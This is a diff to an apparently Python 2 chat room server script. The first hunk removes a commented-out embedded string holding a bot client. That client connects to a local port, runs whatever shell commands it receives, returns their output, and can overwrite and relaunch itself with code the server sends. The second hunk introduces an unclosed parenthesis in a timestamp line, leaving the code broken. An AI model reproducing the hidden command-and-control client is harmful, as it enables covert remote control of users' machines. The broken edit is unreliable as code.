@@ -39,7 +39,6 @@ port = 99999
 configcont = "#Replace Everything behind = sign\n#Ex before: config = edit\n#Ex after: config = configinput\n\nmotd = Hello world This is a new Chat Room Server made by Camerin Figueroa\nport = 22550\n"
 if os.path.isfile('./crsconfig.txt') == True:
     f = open('./crsconfig.txt', 'r')
-    #configuration = 'import socket\nimport os\nimport time\nimport subprocess\nimport sys\ncv = "1.1"\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_address = (\'127.0.0.1\', 65021)\nsock.connect(server_address)\nrcv = sock.recv(128)\nsock.send(cv)\ncid = sock.recv(1024)\nif cid == "newver":\n    print "initiating update"\n    output = sock.recv(1024)\n    print output\n    if output == "tb:2":\n        print "tb2"\n        output1 = sock.recv(1024)\n        output2 = sock.recv(1024)\n        output = output1 + output2\n    elif output == "tb:3":\n        print "tb3"\n        output1 = sock.recv(1024)\n        output2 = sock.recv(1024)\n        output3 = sock.recv(1024)\n        output = output1 + output2 + output3\n    else:\n        print "tb1"\n        output = sock.recv(1024)\n    path = os.path.realpath(__file__)\n    f = open(path, \'w\')\n    f.write(output)\n    f.close()\n    os.system("python " + path + " &")\n    sys.exit()\nelse:\n    pass\nprint cid\nwhile True:\n    try:\n        sock.send("Ping")\n        data = sock.recv(1024)\n        cmd = data\n        print "Running " + cmd\n        if " " in data:\n            cmd.split(" ")\n            output = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True).communicate()[0]\n        else:\n            output = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True).communicate()[0]\n        sock.send(cid + ":" + output)\n    except:\n        pass\n    time.sleep(20)\nsock.close()\n'
     configuration = f.read()
     f.close()
     configuration = configuration.split("\n")
@@ -278,7 +277,7 @@ def writeoutput(q, errors):
         subprocess.Popen(['mkdir', './logs'], stdout=subprocess.PIPE,).communicate()[0]
     else:
         pass
-    tim = str(datetime.datetime.now())
+    tim = str(datetime.datetime.now(
     tim = tim.replace(" ", "")
     log = "./logs/log" + tim + ".txt"
     while True:
